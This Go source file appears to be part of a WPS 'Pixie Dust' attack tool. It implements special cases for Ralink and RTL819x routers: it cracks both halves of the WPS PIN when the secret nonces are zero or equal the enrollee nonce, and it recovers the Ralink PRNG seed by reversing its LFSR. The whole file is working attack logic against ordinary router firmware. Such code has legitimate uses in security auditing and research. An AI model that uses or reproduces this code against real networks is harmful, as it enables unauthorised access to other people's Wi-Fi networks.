/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust



func (pda *pixieDustAttack) trySpecialCases() {
    if pda.auto { return }

    // ES1 = ES2 = 0
    if !pda.isRTL819x {
        pda.ralinkRT()  // it can stop here if true
    }

    // ES1 = ES2 = E-Nonce
    pda.lazyRTL819x()
}



func (pda *pixieDustAttack) ralinkRT() {
    pda.crackFirstHalf([]byte{})
    pda.crackSecondHalf()
    
    if !pda.pinFound() {
        return
    }

    pda.recoverRalinkSeed()
    pda.foundMode = rt
    pda.displayPIN()
}



func (pda *pixieDustAttack) recoverRalinkSeed() {
    if len(pda.eNonce) < wpsNonceLen { 
        pda.nonceSeed = 0
        return
    }

    var sreg uint32  = 0
    lenENonce       := len(pda.eNonce)

    for i := lenENonce - 1; i >= 0; i-- {
        sreg = ralinkRandStateRestore(sreg, pda.eNonce[i])
    }

    pda.nonceSeed = sreg
}



func ralinkRandStateRestore(sreg uint32, r byte) uint32 {
    for range 8 {
        result := r & 1
        r >>= 1
        
        if result != 0 {
            sreg = ((sreg << 1) ^ 0x80000057) | 0x00000001
        } else {
            sreg = sreg << 1
        }
    }

    return sreg
}



func (pda *pixieDustAttack) lazyRTL819x() {
    pda.crackFirstHalf([]byte{})
    pda.crackSecondHalf()

    if !pda.pinFound() {
        return
    }

    pda.foundMode = rtl819x
    pda.displayPIN()
}